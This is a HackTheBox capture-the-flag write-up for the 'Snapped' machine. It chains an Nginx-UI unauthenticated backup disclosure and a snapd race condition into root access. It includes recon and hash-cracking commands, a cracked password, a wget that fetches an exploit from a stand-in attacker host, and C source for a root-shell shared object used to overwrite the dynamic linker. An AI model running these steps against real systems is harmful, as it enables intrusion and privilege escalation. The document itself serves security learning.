# HackTheBox — Snapped

**Platform:** HackTheBox | **OS:** Linux | **Difficulty:** Hard | **Status:** Retired  
**Release Date:** 23 Mar 2026  
**CVEs Covered:** CVE-2026-27944 · CVE-2026-3888  
**Tools Used:** Nmap, ffuf, feroxbuster, Python (pycryptodome), SQLite, Hashcat, snap-confine exploit

---

## Summary

Snapped is a Hard-rated Linux machine that chains two real-world CVEs to achieve full system compromise from an unauthenticated starting position. The foothold exploits **CVE-2026-27944**, an unauthenticated backup disclosure vulnerability in Nginx-UI where the application hands over its own AES decryption key in the same response that delivers the encrypted backup. Decrypting the archive exposes a SQLite database containing bcrypt password hashes, one of which cracks to yield SSH access. Privilege escalation exploits **CVE-2026-3888**, a high-severity TOCTOU race condition in snapd where an interaction between `snap-confine` (a SUID-root binary) and `systemd-tmpfiles` allows an unprivileged user to replace the dynamic linker with a malicious payload and gain a root shell.

---

## Attack Chain Overview

```
Nmap → Virtual host discovery (ffuf) → admin.snapped.htb (Nginx-UI v2.3.2)
→ CVE-2026-27944: GET /api/backup (no auth) → AES key in X-Backup-Security header
→ Decrypt backup → SQLite database → bcrypt hash (jonathan)
→ Hashcat crack → SSH as jonathan → user.txt
→ snapd 2.63.1 identified → CVE-2026-3888 TOCTOU race
→ AF_UNIX socket backpressure → dynamic linker hijack → root shell → root.txt
```

---

## 1. Reconnaissance

### Port Scan

```bash
sudo nmap -p- --min-rate 10000 10.129.34.143
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Full version scan against confirmed ports:

```bash
sudo nmap -p 22,80 -sCV 10.129.34.143
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
```

**Analysis:**

- **Port 22** — OpenSSH 9.6p1 on Ubuntu 24.04. Not directly exploitable; noted as a potential SSH target once credentials are obtained.
- **Port 80** — nginx 1.24.0 redirecting to `snapped.htb`. Virtual hosting in use — subdomain enumeration required.

Add the hostname to `/etc/hosts`:

```bash
echo "10.129.34.143 snapped.htb" | sudo tee -a /etc/hosts
```

<img width="770" height="359" alt="image" src="https://github.com/user-attachments/assets/ff18aedf-4f25-48d6-ad16-93758a63a549" />


---

## 2. Web Enumeration

### Main Site — snapped.htb

Navigating to `http://snapped.htb` serves a static marketing page for an infrastructure orchestration platform. All links are anchor tags pointing to sections of the same page. No login panel, no forms, no dynamic content — dead end for direct exploitation.

```bash
feroxbuster -u http://snapped.htb -x html
```

```text
200  GET  http://snapped.htb/
200  GET  http://snapped.htb/index.html
200  GET  http://snapped.htb/style.css
```

Nothing beyond the static site. Attention shifts to virtual host discovery.

<img width="1166" height="938" alt="image" src="https://github.com/user-attachments/assets/7db941ba-d5b3-4f2b-a725-de149be0fcfd" />


### Virtual Host Discovery

```bash
ffuf -u http://10.129.34.143 \
  -H 'Host: FUZZ.snapped.htb' \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -ac
```

```text
admin     [Status: 200, Size: 1407, Words: 164, Lines: 50]
```

Update `/etc/hosts`:

```bash
echo "10.129.34.143 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts
```

<img width="771" height="486" alt="image" src="https://github.com/user-attachments/assets/5a468ef7-5473-490e-868d-e67cd9adaa8e" />


### admin.snapped.htb — Nginx-UI

Navigating to `http://admin.snapped.htb` reveals an **Nginx-UI** admin panel — a third-party web interface for managing Nginx configurations, written in Go (backend) and Vue.js (frontend).

Version fingerprinting via the loaded JavaScript assets:

```bash
curl http://admin.snapped.htb/ -s | grep -P '.js\b'
# Returns: ./assets/index-DoHxQupa.js

curl http://admin.snapped.htb/assets/version-BWPlJ0ga.js
# Returns: const t="2.3.2"
```

**Nginx-UI version: 2.3.2** — this version is vulnerable to CVE-2026-27944.

<img width="1919" height="920" alt="image" src="https://github.com/user-attachments/assets/8bac999d-8de1-49b9-9414-7997240fdc3c" />

API endpoint enumeration:

```bash
feroxbuster -u http://admin.snapped.htb/api
```

The `/api/backup` endpoint responds without requiring authentication — confirming the CVE is present.

---

## 3. Exploitation — CVE-2026-27944 (Nginx-UI Unauthenticated Backup Disclosure)

### Vulnerability Explanation

Nginx-UI exposes a `/api/backup` endpoint that generates and serves a full AES-encrypted backup of the application — including Nginx configs, SSL keys, session data, and its internal SQLite database. The critical design flaw is that **the AES decryption key is returned in the `X-Backup-Security` response header of the same unauthenticated request** that delivers the encrypted backup. An attacker needs no credentials, no brute force, and no prior access to fully decrypt the backup in a single HTTP request.

This is a complete, unauthenticated path to the application's internal database.

### Setting Up the Exploit Script

Create a Python virtual environment and install the required AES library:

```bash
mkdir -p exploit && cd exploit
python3 -m venv venv
source venv/bin/activate
pip install pycryptodome
```

The exploit script (`exploit_enhanced.py`) performs three operations:

1. Sends `GET /api/backup` with no authentication headers.
2. Extracts the AES key and IV from the `X-Backup-Security` response header.
3. Decrypts the backup archive and extracts its contents to `backup_extracted/`.

<img width="577" height="674" alt="image" src="https://github.com/user-attachments/assets/6894bb80-1e7f-4744-a41e-1203fdbb5191" />


### Running the Exploit

```bash
python3 exploit_enhanced.py --target http://admin.snapped.htb --out backup.bin --decrypt
```

<img width="813" height="679" alt="image" src="https://github.com/user-attachments/assets/66389c77-4dc3-4458-8983-b136ca808911" />


---

## 4. Credential Recovery

### Inspecting the Backup

```bash
ls backup_extracted/
```

The extracted backup contains Nginx configuration files and a **SQLite database** — Nginx-UI's internal user store.

<img width="1021" height="61" alt="image" src="https://github.com/user-attachments/assets/4e66f75a-6680-4ef6-b0dc-a4d2012da117" />


### Dumping the Database

```bash
sqlite3 backup_extracted/database.db
.tables
SELECT * FROM users;
```

<img width="1453" height="302" alt="Screenshot 2026-05-19 070939" src="https://github.com/user-attachments/assets/2e77d598-cdc2-4410-b411-fd207bf54edd" />


The database contains a user **jonathan** with a bcrypt-hashed password:

```text
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

### Cracking the Hash

Save to `hash.txt` and run Hashcat. Bcrypt (mode 3200) is computationally expensive by design — GPU cracking is significantly faster than CPU:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

[Screenshot: Hashcat running against the bcrypt hash with rockyou.txt]

The hash cracks to: **linkinpark**

[Screenshot: Hashcat showing cracked result — hash:linkinpark]

---

## 5. Initial Access — SSH as jonathan

```bash
ssh jonathan@snapped.htb
# Password: linkinpark
```

```bash
cat /home/jonathan/user.txt
```

[Screenshot: SSH session — whoami returning jonathan, user.txt flag visible]

**User flag captured.**

---

## 6. Post-Exploitation Enumeration

### System Information

```bash
uname -a
cat /etc/os-release
```

```text
Ubuntu 24.04 LTS (Noble Numbat)
```

### Identifying snapd

```bash
snap version
```

```text
snap    2.63.1
snapd   2.63.1
series  16
ubuntu  24.04
kernel  6.8.0-52-generic
```

**snapd 2.63.1** on Ubuntu 24.04 — directly within the vulnerable range for CVE-2026-3888. Confirming snap applications are installed:

```bash
snap list
```

[Screenshot: snap version and snap list output confirming snapd 2.63.1 and installed snaps]

The presence of a SUID-root `snap-confine` binary is the core precondition for the privilege escalation:

```bash
find / -name snap-confine -perm -4000 2>/dev/null
ls -la /usr/lib/snapd/snap-confine
```

[Screenshot: snap-confine located with SUID bit set and owned by root]

---

## 7. Privilege Escalation — CVE-2026-3888 (snapd TOCTOU Race Condition)

### Vulnerability Explanation

CVE-2026-3888 is a **TOCTOU (Time-of-Check to Time-of-Use)** race condition in snapd, discovered by the Qualys Threat Research Unit. It exploits a timing conflict between two trusted system components:

**snap-confine** is a SUID-root binary responsible for setting up execution sandboxes for snap applications. When a snap app launches, `snap-confine` creates a private working directory under `/tmp/snap.*/` and uses it during the bind-mount sequence that builds the sandbox's mount namespace.

**systemd-tmpfiles** periodically cleans up stale temporary directories — including those left by snap after a crash or incomplete launch.

**The race condition:** After `systemd-tmpfiles` deletes the `/tmp/snap.*` directory, there is a window before `snap-confine` recreates it where an attacker can create the directory themselves with attacker-controlled content. If the attacker wins the race, `snap-confine` proceeds to use the poisoned directory as trusted, performing bind-mounts against attacker-controlled files.

By replacing `ld-linux-x86-64.so.2` (the dynamic linker) inside the poisoned directory with a malicious shared object, and using an **AF_UNIX socket backpressure** trick to slow down `snap-confine`'s execution timing, the attacker forces the SUID-root binary to load and execute the malicious linker — resulting in a root shell.

### Downloading the Exploit

```bash
# On attacker machine — set up a Python HTTP server to transfer the exploit
python3 -m http.server 8080

# On target machine
cd /tmp
wget http://YOUR_IP:8080/exploit.py
chmod +x exploit.py
```

[Screenshot: Exploit file transferred to /tmp on target]

### Building the Malicious Shared Object

The exploit compiles a malicious shared object (`librootshell.so`) that will be loaded by the SUID `snap-confine` binary when the race is won. The payload executes a root shell:

```c
// rootshell.c — compiled into librootshell.so
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o librootshell.so rootshell.c -nostartfiles
```

[Screenshot: GCC compiling librootshell.so successfully]

### Running the Race Condition Exploit

The exploit targets a snap application installed on the system (e.g., Firefox) to trigger `snap-confine`. In one terminal, start the exploit loop:

```bash
python3 exploit.py --snap firefox --payload librootshell.so
```

Expected output during a successful run:

```text
[*] CVE-2026-3888 — firefox 24.04 helper
[*] Setting up .snap and .exchange directory...
[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
[*] Starting race against snap-confine...
[*] Reading snap-confine output (PID 11301)...
DEBUG: initializing mount namespace: firefox ...
[!] TRIGGER DETECTED! Swapping .exchange...
[+] SWAP DONE! Race won.
```

[Screenshot: Exploit running — showing race loop iterations and TRIGGER DETECTED output]

### Confirming the Swap

Once the race is won, verify the dynamic linker in the snap process namespace is now owned by `jonathan` (meaning it was successfully replaced):

```bash
SPID=$(pgrep -f "sleep 99994" | head -1)
stat -c '%U' /proc/$SPID/root/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
# Returns: jonathan
```

[Screenshot: stat output confirming the dynamic linker is now owned by jonathan]

### Writing the Payload and Triggering Root

Navigate into the snap process's `/proc` namespace root and write the malicious shared object over the dynamic linker:

```bash
cd /proc/$SPID/root
cp /usr/bin/busybox ./tmp/sh
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

[Screenshot: cp and cat commands executing inside /proc namespace root]

The SUID `snap-confine` binary now loads the poisoned linker and executes the constructor function as root.

### Root Shell

```bash
whoami
# root

cat /root/root.txt
```

[Screenshot: Terminal showing root shell — whoami returning root and root.txt flag visible]

**Root flag captured.**

---

## Lessons Learned

**Self-defeating encryption is worse than no encryption.** CVE-2026-27944 is a textbook example of security theater — the application encrypted its backup but included the decryption key in the same response. In a real engagement, any endpoint returning sensitive material alongside its own decryption mechanism is an automatic critical finding regardless of the encryption algorithm used.

**TOCTOU vulnerabilities in privileged binaries have an outsized blast radius.** CVE-2026-3888 demonstrates why race conditions in SUID binaries are treated as high-severity even when the window is narrow. The combination of a trusted cleanup daemon (systemd-tmpfiles), a privileged binary with filesystem assumptions (snap-confine), and an attacker-controlled timing mechanism (AF_UNIX socket backpressure) creates a fully reliable exploit chain on default Ubuntu installations.

**Subdomain enumeration is not optional.** The entire attack path began with discovering `admin.snapped.htb`. The main domain was a dead end. Without virtual host fuzzing, the Nginx-UI panel — and with it the entire vulnerability chain — would have been invisible.

**Bcrypt does not compensate for weak passwords.** The hash was bcrypt with a cost factor of 10, which is correctly configured. The password (`linkinpark`) was in rockyou.txt. Algorithm strength is irrelevant if the underlying secret is weak. Password spray / credential cracking is always worth attempting against recovered hashes regardless of the hashing algorithm.

**Snapd and systemd-tmpfiles interactions are a meaningful attack surface on Ubuntu.** Any Ubuntu system running snapd with snaps installed should be assessed for snap version during privilege escalation enumeration. CVE-2026-3888 affects Ubuntu 16.04 through 24.04 LTS and is fixed only in snapd >= 2.73.

---

## References

- [CVE-2026-27944 — Nginx-UI Backup Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2026-27944)
- [CVE-2026-3888 — Qualys TRU Advisory](https://www.qualys.com/2026/03/CVE-2026-3888)
- [HTB Official CVE Breakdown — War Room](https://www.hackthebox.com/blog/CVE-2026-27944-CVE-2026-3888)
- [Nginx-UI GitHub](https://github.com/0xJacky/nginx-ui)
- [HackTheBox — Snapped](https://www.hackthebox.com/machines/snapped)
